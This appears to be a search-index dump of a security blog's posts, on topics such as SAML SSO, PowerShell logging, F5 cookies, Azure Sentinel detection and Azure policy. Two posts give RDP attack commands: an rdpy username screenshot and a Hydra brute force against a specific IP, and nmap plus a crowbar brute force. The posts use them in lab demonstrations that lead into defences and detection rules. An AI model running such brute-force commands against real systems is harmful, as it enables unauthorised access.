> www.identityprovider.com <saml:Assertion ID=\"fciE1SgZ2WX-duiqbwBiuvZj9XT\" IssueInstant=\"2016-03-04T01:06:17.050Z\" Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" > www.identityprovider.com SM2NhtM3jExOy/RDnCMWc/RKnOfsOs2nr3o9JQMjgdT/g16mcxEA6c+1jRPl8imlhNFk48t6obmN 48DEDA35890E4746A134920E70844E6A NotOnOrAfter=\"2016-03-04T01:11:17.050Z\" InResponseTo=\"WqhmvfUP409yzJmtplCn7RREN\\_z\" /> <saml:Conditions NotBefore=\"2016-03-04T01:01:17.050Z\" NotOnOrAfter=\"2016-03-04T01:11:17.050Z\" > www.serviceprovider.com <saml:AuthnStatement SessionIndex=\"fciE1SgZ2WX-duiqbwBiuvZj9XT\" AuthnInstant=\"2016-03-04T01:06:17.050Z\" > 5. SP federation engine validates the SAML assertion and redirects to SP portal SP federation engine verifies the signature on the SAML with the publice cert (previously sent offline) and if the verification is successful, creates the session (e.g. via a cookie). The RelayState token also comes as part of the POST request. It also pulls up the originally requested URL mapped with that token and redirects the user to the the URL.","title":"SP-Initiated Single Sign On using SAML 2.0&ndash;Architecture and a simple implementation"},{"location":"2016/09/2016-09-29-powershell-transcription-and-script-bulk-logging/","text":"PowerShell is indeed command prompt on steroids. The dev and IT productivity can be multifolded using PowerShell. Having said that, PowerShell can be used to execute malicious commands on the host machine. Fortunately, the group policy allows to not only transcribe every PowerShell command on the host machine but also log the WHOLE PowerShell script (every line of it) executed as such or using by other means e.g. using System.Management.Automation to invoke PowerShell commands. The logs then can be ingested into a SIEM for monitoring and alerting. PowerShell Transcription Below screenshot shows that If you enable the PowerShell Transcription and specify a log location, any PowerShell command you execute will be transcribed in a file in the specified location. Script bulk logging Below screenshot shows If you enable PowerShell script bulk logging, any script you execute will be logged in the event viewer [Application and Services Logs > Microsoft > Windows > PowerShell > Operational] Logging for the Powershell script executed using C# (System.Management.Automation) The below C# code is using System.Management.Automation to execute the PowerShell script. The script was compiled and executed on the host machine. The PowerShell script which got executed from this C# app was logged in the event viewer [Application and Services Logs > Microsoft > Windows > PowerShell > Operational].","title":"PowerShell Transcription and script bulk logging"},{"location":"2016/10/2016-10-25-f5-irules-setting-the-httponly-flag-on-a-http-cookie/","text":"HttpOnly flag on a cookie prevents the client side code to access the cookie. More details here . If you set this flag on the cookie in the HTTP_RESPONSE in the iRule, you get the below error : when HTTP_RESPONSE { HTTP::cookie insert name \"UserName\" value \u201cjohn.doe\u201d path \"/\" domain \"xyz.com\" HTTP::cookie httponly \"UserName\" enable } Improper version invoked from within \"HTTP::cookie httponly \"UserName\" enable\" If you create a cookie using the insert method the cookie is created with version 0. If you try to change Its version to 1 to avoid the above error, you will get another error. when HTTP_RESPONSE { HTTP::cookie insert name \"UserName\" value \u201cjohn.doe\u201d path \"/\" domain \"xyz.com\" HTTP::cookie version \"UserName\" 1 HTTP::cookie httponly \"UserName\" enable } Illegal argument (line x) invoked from within \"HTTP::cookie version \"UserName\" \"1\" The right way to add the httponly flag to a cookie is to specify the version while you are inserting it and then set the httponly flag. when HTTP_RESPONSE { HTTP::cookie insert name \"UserName\" value \u201cjohn.doe\u201d path \"/\" domain \"xyz.com\" version 1 HTTP::cookie version \"UserName\" 1 HTTP::cookie httponly \"UserName\" enable } Testing If you have a chrome extension like EditThisCookie which can let you view all the cookies for the web app, you can notice the HttpOnly flag checked for the cookie. With httponly not enabled on the cookie, the cookie can be accessed via the client side script document.cookie With httponly not enabled on the cookie, the cookie can NOT be accessed via the client side script document.cookie.","title":"F5 iRules : Setting the HttpOnly flag on a HTTP cookie"},{"location":"2016/10/2016-10-25-f5-irules-setting-the-httponly-flag-on-a-http-cookie/#testing","text":"If you have a chrome extension like EditThisCookie which can let you view all the cookies for the web app, you can notice the HttpOnly flag checked for the cookie. With httponly not enabled on the cookie, the cookie can be accessed via the client side script document.cookie With httponly not enabled on the cookie, the cookie can NOT be accessed via the client side script document.cookie.","title":"Testing"},{"location":"2017/06/2017-06-10-gcih-certification/","text":"Passed GCIH (GIAC Certified Incident Handler).This was a tough one. https://twitter.com/ashishrocks/status/873014796576280577","title":"GCIH Certification"},{"location":"2018/02/2018-02-05-won-the-challenge-coin-sans-for500-windows-forensics-analysis/","text":"Feel very privileged to be part of that group! https://twitter.com/robtlee/status/959902237668540416","title":"Won the challenge coin! SANS FOR500 &ndash; Windows Forensics Analysis"},{"location":"2018/07/2018-07-04-compromising-a-azure-windows-2008-r2-sp1-vm/","text":"TL;DR ( Too long Didn\u2019t Read ) If you stand up a windows 2008 R2 VM in Azure with a random user name and password, Its very easy to know that user name and depending on the complexity of the chosen password, It may be feasible to brute-force the VM using RDP. Below is the process we will follow : 1) As a victim, set up the Azure VM and RDP to it 2) As an attacker, determine the user name for the Azure VM. 3) As an attacker, determine the password for the Azure VM. 4) Simple steps to defend against the attack. As a victim, set up the Azure VM and RDP to it Log in to the Azure portal and create the VM Choose Windows 2008 R2 SP1 Machine Name : Test-Machine-1 Username : SomeRandomName Password: Choose a password. Resource Group : Select an existing or just create a new one. Be cheap and select the lowest cost disk from the list. Select the RDP from the public inbound port Finally click on the \u201cCreate\u201d button to create the VM Once the VM is created and running (you will see a notification in the portal), you should see the VM in the list with \u201cRunning\u201d status. Click on the \u201cTest-Machine-1\u201d VM entry in the above list and then click on the \u201cConnect\u201d button. Click on the \u201cDownload RDP File\u201d to download the RDP file for the VM. Open the RDP file for the VM and enter the credential you used while setting up the VM. and now we are in the VM As an attacker, determine the user name for the Azure VM There is a easier way to determine the user name rather than brute-forcing the VM. If the victim is logged in to the VM, the attacker can use something like rdpy-rdpscreenshot.py which is one of the fantastic binaries in rdppy by Sylvain Peyrefitte ( @citronneur ) which allows to take the screenshot of the login screen. See in the below screenshot. It connected to the IP address 40.76.88.172 and saved the screenshot to c:\\temp\\test_40.76.88.172.jpg. python rdpy-rdpscreenshot.py -o c:\\temp\\test_ 40.76.88.172:3389 Here is the file with screenshot of the login screens showing the user name for the machine. This was possible because Windows 2008 R2 supports Network Level Authentication \u2013 which completes the user authentication before you establish a RDP connection and the logon screen appears. As an attacker, determine the password for the Azure VM You can use a RDP brute-forcing utility such as Hydra [ https://github.com/maaaaz/thc-hydra-windows ] to determine the password for the user from a password list. hydra -C \"C:\\temp\\login-password-list.txt\" 40.76.88.172 rdp Simple steps to defend against the attack When you set up the VM and setting up the RDP for it, It warns you about RDP will be exposed to the internet. So, you should limit access to the RDP from your/your organization\u2019s public IP address/CIDR only through the network security group changes for RDP. VM Settings > Networking> RDP > Source IP addresses/CIDR ranges Now with the source IP restriction, rdpy-rdpscreenshot.py from a different IP wont be able to reach the VM to take the screenshot of the login screen.","title":"Compromising an Azure Windows 2008 R2 SP1 VM"},{"location":"2018/07/2018-07-04-compromising-a-azure-windows-2008-r2-sp1-vm/#as-a-victim-set-up-the-azure-vm-and-rdp-to-it","text":"Log in to the Azure portal and create the VM Choose Windows 2008 R2 SP1 Machine Name : Test-Machine-1 Username : SomeRandomName Password: Choose a password. Resource Group : Select an existing or just create a new one. Be cheap and select the lowest cost disk from the list. Select the RDP from the public inbound port Finally click on the \u201cCreate\u201d button to create the VM Once the VM is created and running (you will see a notification in the portal), you should see the VM in the list with \u201cRunning\u201d status. Click on the \u201cTest-Machine-1\u201d VM entry in the above list and then click on the \u201cConnect\u201d button. Click on the \u201cDownload RDP File\u201d to download the RDP file for the VM. Open the RDP file for the VM and enter the credential you used while setting up the VM. and now we are in the VM","title":"As a victim, set up the Azure VM and RDP to it"},{"location":"2018/07/2018-07-04-compromising-a-azure-windows-2008-r2-sp1-vm/#as-an-attacker-determine-the-user-name-for-the-azure-vm","text":"There is a easier way to determine the user name rather than brute-forcing the VM. If the victim is logged in to the VM, the attacker can use something like rdpy-rdpscreenshot.py which is one of the fantastic binaries in rdppy by Sylvain Peyrefitte ( @citronneur ) which allows to take the screenshot of the login screen. See in the below screenshot. It connected to the IP address 40.76.88.172 and saved the screenshot to c:\\temp\\test_40.76.88.172.jpg. python rdpy-rdpscreenshot.py -o c:\\temp\\test_ 40.76.88.172:3389 Here is the file with screenshot of the login screens showing the user name for the machine. This was possible because Windows 2008 R2 supports Network Level Authentication \u2013 which completes the user authentication before you establish a RDP connection and the logon screen appears.","title":"As an attacker, determine the user name for the Azure VM"},{"location":"2018/07/2018-07-04-compromising-a-azure-windows-2008-r2-sp1-vm/#as-an-attacker-determine-the-password-for-the-azure-vm","text":"You can use a RDP brute-forcing utility such as Hydra [ https://github.com/maaaaz/thc-hydra-windows ] to determine the password for the user from a password list. hydra -C \"C:\\temp\\login-password-list.txt\" 40.76.88.172 rdp","title":"As an attacker, determine the password for the Azure VM"},{"location":"2018/07/2018-07-04-compromising-a-azure-windows-2008-r2-sp1-vm/#simple-steps-to-defend-against-the-attack","text":"When you set up the VM and setting up the RDP for it, It warns you about RDP will be exposed to the internet. So, you should limit access to the RDP from your/your organization\u2019s public IP address/CIDR only through the network security group changes for RDP. VM Settings > Networking> RDP > Source IP addresses/CIDR ranges Now with the source IP restriction, rdpy-rdpscreenshot.py from a different IP wont be able to reach the VM to take the screenshot of the login screen.","title":"Simple steps to defend against the attack"},{"location":"2019/02/2019-02-17-identify-critical-assets-in-your-environment-using-f5-load-balancer/","text":"Identifying the servers hosting critical applications in your environment is crucial so that alerts for unusual events on those servers are put on higher priority for your security operations team. One of the approaches we can take to identify the critical assets is by leveraging the load balancer. This could be a head start to build a mini-CMDB (Configuration Management Database) for assets for your sec ops team. Below is an over-simplified example of network architecture showing a critical web app named \u201cexample.com\u201d web app hosted by 5 servers which are load balanced on F5 (VIP : 172.22.23.11). Out of the 5 servers, only 3 servers are active. In this example, the goal is to get the active servers behind the VIP. I wrote a PowerShell script to get all the active servers behind all the active VIPs on the a given load balancer. Why this approach? If the server is hosting an app which is critical, It has to be load balanced. If a new server is added to an existing VIP, this script will get it. If a server is decommissioned, It would be inactive to the load balancer and therefore the script will ignore it. If the script is scheduled to run periodically, we will have an up-to-date list of servers which are running critical applications. That list can be integrated with SIEM to prioritize alerts from the those servers. The script The PowerShell script makes use of PowerShell cmdlet for F5 which can be downloaded from the below location. https://devcentral.f5.com/d/microsoft-powershell-with-icontrol?download=true The downloaded file is a .zip file. You copy to your local folder, unzip it and run .\\setupSnapin.ps1 which is unzipped file. You may get an error : Could not load file or assembly iControlSnapin.dll or one of its dependencies. Operation is not supported. (Exception from HRESULT: 0x8013515 Make sure the \u201cUnblock\u201d is checked from all the files in the unzipped file including \u201csetupSnapin.ps1\u201d .\\setupSnapin.ps1 should work fine now. Below is the script. You will need to change the F5 IP address and the partition name where the virtual servers reside. The output of the script is saved to a file named \u201cServerList.csv\u201d Add-PSSnapIn iControlSnapIn function GetPoolMembers($poolname,$virtual_server_name_only,$virtual_ip) { $poolmembers = $ic.LocalLBPool.get\\_member\\_v2(@($poolname)) $test = $poolmembers\\[0\\] write-output($poolname) write-output ('Backend servers and ports :') $member\\_status = $ic.LocalLBPool.get\\_member\\_object\\_status($poolname,$poolmembers) $node\\_index = 0 foreach($poolmember in $test) { $availability\\_status = $member\\_status\\[0\\]\\[$node\\_index\\].availability\\_status if($availability\\_status -eq \"AVAILABILITY\\_STATUS\\_GREEN\") { $ip\\_address = $poolmember\\[0\\].address.replace($active\\_folder,\"\").replace(\"/\",\"\") write-output($ip\\_address ) $global:server\\_node\\_details += $ip\\_address+\",\"+$virtual\\_server\\_name\\_only + \",\" + $virtual\\_ip +\"\\`n\" write-output($global:server\\_node\\_details) } $node\\_index = $node\\_index + 1 } write-output $global:server\\_node\\_details } $global:server_node_details = \"sep=,\"+\"`n\" $global:server_node_details += \"Server IP,F5 Virtual IP,F5 Virtual Server Name\" +\"`n\" $connection = Initialize-F5.iControl -Hostname -Credentials (Get-Credential) $ic = Get-F5.iControl Set the active folder aka partitions where you know the virtul servers exist $active_folder = \"/YourPartitionName/\" $ic.SystemSession.set_active_folder($active_folder) get list of all the virtual servers $virtual_server_list = $ic.LocalLBVirtualServer.get_list() $virtual_server_with_server_side_profile = @() foreach($virtualserver in $virtual_server_list) { $object\\_status = $ic.LocalLBVirtualServer.get\\_object\\_status($virtualserver).availability\\_status if($object\\_status -eq \"AVAILABILITY\\_STATUS\\_GREEN\") { $virtual\\_server\\_name\\_only = $virtualserver.replace($active\\_folder,\"\") write-output ('Virtual server name ' + $virtualserver) write-output ($object\\_status) $addresses = $ic.LocalLBVirtualServer.get\\_destination\\_v2($virtualserver) write-output($addresses.Length) $virtual\\_ip = $addresses\\[0\\].address.replace($active\\_folder,\"\") write-output('Virtual IP address : ' + $virtual\\_ip ) $pool\\_name = $ic.LocalLBVirtualServer.get\\_default\\_pool\\_name($virtualserver) GetPoolMembers $pool\\_name $virtual\\_ip $virtual\\_server\\_name\\_only } } $global:server_node_details | Out-File -FilePath .\\ServerList.csv The output The script output has 3 columns for each server in with Its Virtual IP and Virtual server name. Virtual server name is an identifier for the Virtual IP address on the load balancer. That name provides an indication of what that server is used for. This approach groups servers by their Virtual server name and saves identifying each server for what it is used for. In the below hypothetical example for the output, servers 172.22.1.1, 172.22.1.2 and 172.22.1.3 running example.com web app.","title":"Identify Critical Assets in your environment using F5 Load balancer"},{"location":"2019/02/2019-02-17-identify-critical-assets-in-your-environment-using-f5-load-balancer/#set-the-active-folder-aka-partitions-where-you-know-the-virtul-servers-exist","text":"$active_folder = \"/YourPartitionName/\" $ic.SystemSession.set_active_folder($active_folder)","title":"Set the active folder aka partitions where you know the virtul servers exist"},{"location":"2019/02/2019-02-17-identify-critical-assets-in-your-environment-using-f5-load-balancer/#get-list-of-all-the-virtual-servers","text":"$virtual_server_list = $ic.LocalLBVirtualServer.get_list() $virtual_server_with_server_side_profile = @() foreach($virtualserver in $virtual_server_list) { $object\\_status = $ic.LocalLBVirtualServer.get\\_object\\_status($virtualserver).availability\\_status if($object\\_status -eq \"AVAILABILITY\\_STATUS\\_GREEN\") { $virtual\\_server\\_name\\_only = $virtualserver.replace($active\\_folder,\"\") write-output ('Virtual server name ' + $virtualserver) write-output ($object\\_status) $addresses = $ic.LocalLBVirtualServer.get\\_destination\\_v2($virtualserver) write-output($addresses.Length) $virtual\\_ip = $addresses\\[0\\].address.replace($active\\_folder,\"\") write-output('Virtual IP address : ' + $virtual\\_ip ) $pool\\_name = $ic.LocalLBVirtualServer.get\\_default\\_pool\\_name($virtualserver) GetPoolMembers $pool\\_name $virtual\\_ip $virtual\\_server\\_name\\_only } } $global:server_node_details | Out-File -FilePath .\\ServerList.csv The output The script output has 3 columns for each server in with Its Virtual IP and Virtual server name. Virtual server name is an identifier for the Virtual IP address on the load balancer. That name provides an indication of what that server is used for. This approach groups servers by their Virtual server name and saves identifying each server for what it is used for. In the below hypothetical example for the output, servers 172.22.1.1, 172.22.1.2 and 172.22.1.3 running example.com web app.","title":"get list of all the virtual servers"},{"location":"2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/","text":"Azure Sentinel is a cloud based SIEM* and SOAR** solution. As it\u2019s still in preview, I wanted to test out few of Its capabilities. In this post we will see how we can detect RDP brute-force attempts and respond using automated playbooks in Azure Sentinel. [*SIEM : Security Incident Event Management] [**SOAR : Security Orchestration Automated Response] https://docs.microsoft.com/en-us/azure/sentinel/overview The infrastructure: I have couple of virtual machines in Azure which have RDP opened (sure, I am the first one to keep that opened ) :-) Below is one of the Win 2012 machine. The Attack: Attackers always the scan the whole CIDR to find the services running on the machines in the range. In this example, simulating the scan, I will use only one machine ( the above one) from the Kali VM looking if the RDP (port 3389) is opened. nmap -p 3389 IPAddress \u2013Pn For brute-force, we will use crowbar . Clone the repository: git clone https://github.com/galkan/crowbar.git I have separate files for usernames(userlist) and passwords(passwordlist) which will be used by Crowbar in combination to attempt to login to the above machine via RDP. python crowbar.py -b rdp -s ipaddress -U userlist -C passwordlist \u2013v -b indicates target service. In this case Its rdp but crowbar also supports openvpn, sskkey and vnckey. -v indicates verbose output You see the combination which has \u201cRDP-SUCCESS\u201d is the right combination of user name and password which was brute-forced for successful login via RDP. Other attempts failed. Of course, I have the right user name and password in the file. :-) Azure Sentinel Now lets get to Azure Sentinel. As noted above, Its a cloud based SIEM. You can quickly locate \u201cAzure Sentinel\u201d from the search bar. Sentinel manages all Its data in a log analytics workspace. If you already have one, you can reuse or create a new one. One of the first thing you notice in Azure Sentinel is a number of in-built Data Connectors available to collect data from different sources. Not only that includes Azure native data sources such as Azure AD, Office 365, Security center to name a few but also third parties like Palo Alto, Cisco ASA, Checkpoint, Fortinet and F5. Pretty sure the list will only get longer. For the purpose of this blog post, we will focus on the \u201cSecurity Events\u201d by clicking on \u201cConfigure\u201d. Select \u201cAll events\u201d. Click on \u201cDownload install Agent for Windows Virtual machines\u201d. Select the Virtual machine where the agent will be installed. Click \u201cConnect\u201d. The \u201cConnect\u201d process takes few minutes to complete. When the machine is shows \u201cConnected\u201d in Azure portal, you will see the Microsoft Monitoring Agent (MMA) service running on the machine which will upload the logs to the Azure sentinel workspace for the subscription. Start writing some queries Azure Sentinel uses Kusto Query Language for read-only requests to process data and return results. In the sentinel workspace, click on \u201cLogs\u201d and use the below query which is basically looking for security events with successful login event (EventId 4624) and unsuccessful login event (EventId 4625) originating from a workstation named \u201ckali\u201d. Note the highlighted event was the only successful attempt(EventId 4624) and rest were failures (4525). SecurityEvent | where (EventID == 4625 or EventID== 4624) and WorkstationName == \"kali\" | project TimeGenerated, EventID , WorkstationName,Computer, Account , LogonTypeName , IpAddress | order by TimeGenerated desc Creating Alerts Create an alert for the above use case by clicking \u201cAnalytics\u201d > Add Give a name to the alert, provide a description. and set the severity. Set the alert query to detect any RDP login failure: SecurityEvent | where EventID == 4625 | project TimeGenerated, WorkstationName,Computer, Account , LogonTypeName , IpAddress | order by TimeGenerated desc Set the entity mapping. These properties will be populated from the projected fields in the query above. Will be very useful information when we build playbooks. As you can see, there are only three properties which could be mapped at this point but more to come. In this example, Account Name used for the attempted login, the host where It is being tried on and the workstation where It is tried from will be populated. Playbook Playbooks in Azure Sentinel are basically Logic apps which is really powerful not only because of the inbuilt templates but also because they can be heavily customized. Sorry, I just wanted to remind myself again and you, dear reader that logic apps are really powerful. :) Create the logic app: In the designer, click on \u201cBlank Logic App\u201d We first need to define the trigger. In this case It would be when the response to an alert is triggered in Azure Sentinel. Search \u201cSentinel\u201d in the textbox and you will find the trigger. Click on the trigger and the trigger will be added as a first step. We will send an email to respective team (e.g. Security Operations) when this event happens. In this case I am sending the email to my Office 365 email address. You will need an Office 365 tenant(sign up for free trial here ) to send email. In the below example, I already one and connected. If I didn\u2019t, all I had to do is to sign-in with my admin office-365 account and connection would be available to send emails. As you click through the subject and body, you will be prompted to select the Dynamic contents which will have relevant data in this case. Cases When an alert fires, I creates a case and you can execute the relevant playbook for the case. In this example, we have a alert configured named \u201crdp-bruce-force attempt-alert\u201d. Every time that alert fires, I will create a new case with the same name as the alert with a case Id. We can then execute the relevant playbook on the case. In this example, we will execute the playbook we created before \u201crdp-bruce-force attempt-alert-playbook\u201d. In the Sentinel workspace, click on \u201cCases\u201d to review all the cases and click on the case which got created for the brute-force attempt. At the bottom the details pane of the case, click on the \u201cView full details\u201d . Click \u201cView Playbooks\u201d Click on \u201cRun\u201d for the playbook we want to execute. Below is the email as a part of the playbook I got with the account names in the security event logs. Hope this helps! :-)","title":"Azure Sentinel &ndash; Detecting brute force RDP attempts"},{"location":"2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/#_1","text":"The infrastructure: I have couple of virtual machines in Azure which have RDP opened (sure, I am the first one to keep that opened ) :-) Below is one of the Win 2012 machine.","title":""},{"location":"2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/#the-attack","text":"Attackers always the scan the whole CIDR to find the services running on the machines in the range. In this example, simulating the scan, I will use only one machine ( the above one) from the Kali VM looking if the RDP (port 3389) is opened. nmap -p 3389 IPAddress \u2013Pn For brute-force, we will use crowbar . Clone the repository: git clone https://github.com/galkan/crowbar.git I have separate files for usernames(userlist) and passwords(passwordlist) which will be used by Crowbar in combination to attempt to login to the above machine via RDP. python crowbar.py -b rdp -s ipaddress -U userlist -C passwordlist \u2013v -b indicates target service. In this case Its rdp but crowbar also supports openvpn, sskkey and vnckey. -v indicates verbose output You see the combination which has \u201cRDP-SUCCESS\u201d is the right combination of user name and password which was brute-forced for successful login via RDP. Other attempts failed. Of course, I have the right user name and password in the file. :-)","title":"The Attack:"},{"location":"2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/#azure-sentinel","text":"Now lets get to Azure Sentinel. As noted above, Its a cloud based SIEM. You can quickly locate \u201cAzure Sentinel\u201d from the search bar. Sentinel manages all Its data in a log analytics workspace. If you already have one, you can reuse or create a new one. One of the first thing you notice in Azure Sentinel is a number of in-built Data Connectors available to collect data from different sources. Not only that includes Azure native data sources such as Azure AD, Office 365, Security center to name a few but also third parties like Palo Alto, Cisco ASA, Checkpoint, Fortinet and F5. Pretty sure the list will only get longer. For the purpose of this blog post, we will focus on the \u201cSecurity Events\u201d by clicking on \u201cConfigure\u201d. Select \u201cAll events\u201d. Click on \u201cDownload install Agent for Windows Virtual machines\u201d. Select the Virtual machine where the agent will be installed. Click \u201cConnect\u201d. The \u201cConnect\u201d process takes few minutes to complete. When the machine is shows \u201cConnected\u201d in Azure portal, you will see the Microsoft Monitoring Agent (MMA) service running on the machine which will upload the logs to the Azure sentinel workspace for the subscription.","title":"Azure Sentinel"},{"location":"2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/#start-writing-some-queries","text":"Azure Sentinel uses Kusto Query Language for read-only requests to process data and return results. In the sentinel workspace, click on \u201cLogs\u201d and use the below query which is basically looking for security events with successful login event (EventId 4624) and unsuccessful login event (EventId 4625) originating from a workstation named \u201ckali\u201d. Note the highlighted event was the only successful attempt(EventId 4624) and rest were failures (4525). SecurityEvent | where (EventID == 4625 or EventID== 4624) and WorkstationName == \"kali\" | project TimeGenerated, EventID , WorkstationName,Computer, Account , LogonTypeName , IpAddress | order by TimeGenerated desc","title":"Start writing some queries"},{"location":"2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/#creating-alerts","text":"Create an alert for the above use case by clicking \u201cAnalytics\u201d > Add Give a name to the alert, provide a description. and set the severity. Set the alert query to detect any RDP login failure: SecurityEvent | where EventID == 4625 | project TimeGenerated, WorkstationName,Computer, Account , LogonTypeName , IpAddress | order by TimeGenerated desc Set the entity mapping. These properties will be populated from the projected fields in the query above. Will be very useful information when we build playbooks. As you can see, there are only three properties which could be mapped at this point but more to come. In this example, Account Name used for the attempted login, the host where It is being tried on and the workstation where It is tried from will be populated.","title":"Creating Alerts"},{"location":"2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/#playbook","text":"Playbooks in Azure Sentinel are basically Logic apps which is really powerful not only because of the inbuilt templates but also because they can be heavily customized. Sorry, I just wanted to remind myself again and you, dear reader that logic apps are really powerful. :) Create the logic app: In the designer, click on \u201cBlank Logic App\u201d We first need to define the trigger. In this case It would be when the response to an alert is triggered in Azure Sentinel. Search \u201cSentinel\u201d in the textbox and you will find the trigger. Click on the trigger and the trigger will be added as a first step. We will send an email to respective team (e.g. Security Operations) when this event happens. In this case I am sending the email to my Office 365 email address. You will need an Office 365 tenant(sign up for free trial here ) to send email. In the below example, I already one and connected. If I didn\u2019t, all I had to do is to sign-in with my admin office-365 account and connection would be available to send emails. As you click through the subject and body, you will be prompted to select the Dynamic contents which will have relevant data in this case.","title":"Playbook"},{"location":"2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/#cases","text":"When an alert fires, I creates a case and you can execute the relevant playbook for the case. In this example, we have a alert configured named \u201crdp-bruce-force attempt-alert\u201d. Every time that alert fires, I will create a new case with the same name as the alert with a case Id. We can then execute the relevant playbook on the case. In this example, we will execute the playbook we created before \u201crdp-bruce-force attempt-alert-playbook\u201d. In the Sentinel workspace, click on \u201cCases\u201d to review all the cases and click on the case which got created for the brute-force attempt. At the bottom the details pane of the case, click on the \u201cView full details\u201d . Click \u201cView Playbooks\u201d Click on \u201cRun\u201d for the playbook we want to execute. Below is the email as a part of the playbook I got with the account names in the security event logs. Hope this helps! :-)","title":"Cases"},{"location":"2020/01/2020-01-22-detection-of-identity-based-risks-using-azure-ad-identity-protection-and-graph-api/","text":"Github repository : https://github.com/ashishmgupta/AzureADIdentityProtection What is Azure AD Identity Protection? Identity Protection is a tool in Azure AD that allows organizations to accomplish three key tasks: Automate the detection and remediation of identity-based risks. Investigate risks using data in the portal. Export risk detection data to third-party utilities for further analysis. Identity Protection identifies risks in the following classifications: Risk Detection Type Description Atypical travel Sign in from an atypical location based on the user\u2019s recent sign-ins. Anonymous IP address Sign in from an anonymous IP address (for example: Tor browser, anonymizer VPNs). Unfamiliar sign-in properties Sign in with properties we\u2018ve not seen recently for the given user. Malware linked IP address Sign in from a malware linked IP address Leaked Credentials This risk detection indicates that the user's valid credentials have been leaked Azure AD threat intelligence Microsoft\u2019s internal and external threat intelligence sources have identified a known attack pattern Source : https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/overview-identity-protection Note : Azure AD Identity Protection is fully available in the Azure AD Premium P2 only. In this blog post, we will focus on detection of the above identity based risks. There are two steps : 1) From Azure Portal, setup the Application (with a token) with configured permissions to read data from Identity Protection. 2) Python script to use Graph API with the above OAuth token to access the Identity protection data to ingest in your SIEM tool. Setting up the application in the Azure portal Azure Active Directory > App Registrations > New Registration Give the application a name. Add API permissions. API Permission > Add a permission Click Microsoft Graph Since we want the logs from an application instead for a user, select Application permission. Now, there are three API and we need specific permissions for them to access data via Graph API. API Name Details Permission Needed Sign Ins Allows query Graph API for information on Azure AD sign-ins with specific properties related to risk state, details and level AuditLog.ReadAll Directory.ReadAll Risky Users Gets users identified by identity protection as risky users. IdentityRiskyUser.ReadAll Risk Detections Gets both risky users and sign-in linked risk detections and associated information identityRiskEvents.ReadAll Above API permissions need to be set under Microsoft Graph as shown below. The Global Administrator of your tenant needs to grant admin consent for the permissions you added. You should contact them for this and get the consent granted. Create a new client secret. Certificate and Secrets > New Client Secret A secret is automatically generated and can be copied. Python script to use Graph API to pull Identity Protection data Below is the screenshot of of a section of the python code which uses the ClientId, Client Secret and the tenant domain to get the OAuth token and then uses the OAuth token to query the Microsoft Graph API to get the identity protection data in the JSON format for both risky users and risky detection. Full source code is located here : https://github.com/ashishmgupta/AzureADIdentityProtection The code also retries in case of the number of requests crosses the threshold (HTTP 429 Too many requests). Hope this post helps you implementing and querying the Azure Identity Protection data in your organization. Please feel free to ask questions in the comments sections below.","title":"Detection of identity-based risks using Azure AD Identity Protection and Graph API"},{"location":"2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/","text":"TLDR; Public Azure virtual machines without any IP restriction is always an attack vector which may result in compromise of the VM and further lateral movement in Azure infrastructure. Azure policy may be used to deny any attempt to even create the virtual machines without IP restriction . This blog post has step-by-step process on how to implement an Azure policy on ALL your subscriptions covering IP restriction for ALL your future virtual machines. What is Azure policy: Azure policy is a service inside Azure that allows configuration management.It executes every time a new resource is added or an existing resource is changed. It has a set of rules, and set of actions. The Azure policy could report the event as non-compliant or even deny the action altogether if the rules are not matched. Azure policy is an excellent way to enforce and bake-in security and compliance in the Azure infrastructure. As you see in the below picture, Azure policy is an integral part of Azure Governance \u2013 mainly consisting of Policy Definitions and Policy Engine which works directly with Azure Resource Manager (ARM). Image source : https://www.microsoft.com/en-us/us-partner-blog/2019/07/24/azure-governance/ Summary: If the Azure virtual machines need to be accessible over internet, Its important to restrict access its access ONLY from your corporate public IP addresses. This will help in couple of situations : a) Limit external access from an attacker. b) Limit Insider threat or misuse from an employee. The IP address restriction could be created while creating the virtual machine using network security groups. However, enforcing this on the policy level by the administrator would ensure we are not dependent on individual team\u2019s best judgment. Process: As a best practice, always test the policy in audit mode before switching to deny mode. In this walkthrough, we will follow below steps : 1) Create the policy definition. 2) Apply the policy (Policy Assignment) in audit mode 3) Test with Audit mode 3) Apply the policy (Policy Assignment) in deny mode 4) Test with Deny mode Create the policy definition On the search bar, search for \u201cpolicy\u201d and click on it. Click Definitions and then click Policy Definition Click the \u2026 button under \u201cDefinition Location\u201d to select the management group. If you want to apply this policy to all subscriptions, don\u2019t select any subscription. To apply this policy to a specific subscription, select the desired subscription under the subscription dropdown. Policy Details: Name: Deny creation of virtual machine without access restricted only from company's public IP addresses (on-prem/VPN) Description ( Change the IP address list below ): Deny creation of virtual machine which does not have external company IP addresses restriction in the network security group. One or more of the below corporate IP addresses must be specified in the network security group when creating the virtual machine. Otherwise, the validation will fail and the virtual machine will not be created. Below is the valid public corporate IP addresses list : 208.114.51.253 104.104.51.253 108.104.51.253 Category : Network Policy Rule: [sourcecode language='python' ] { \"mode\": \"All\", \"policyRule\": { \"if\": { \"allOf\": [ { \"field\": \"type\", \"equals\": \"Microsoft.Network/networkSecurityGroups\" }, { \"count\": { \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules[*]\", \"where\": { \"allOf\": [ { \"anyof\": [ { \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules[*].sourceAddressPrefix\", \"notIn\": [ \"208.114.51.253\", \"104.104.51.253\", \"108.104.51.253\" ] } ] } ] } }, \"greater\": 0 } ] }, \"then\": { \"effect\": \"[parameters('effect')]\" } }, \"parameters\": { \"effect\": { \"type\": \"String\", \"metadata\": { \"displayName\": \"Effect\", \"description\": \"The effect determines what happens when the policy rule is evaluated to match\" }, \"allowedValues\": [ \"audit\", \"deny\" ], \"defaultValue\": \"audit\" } } } 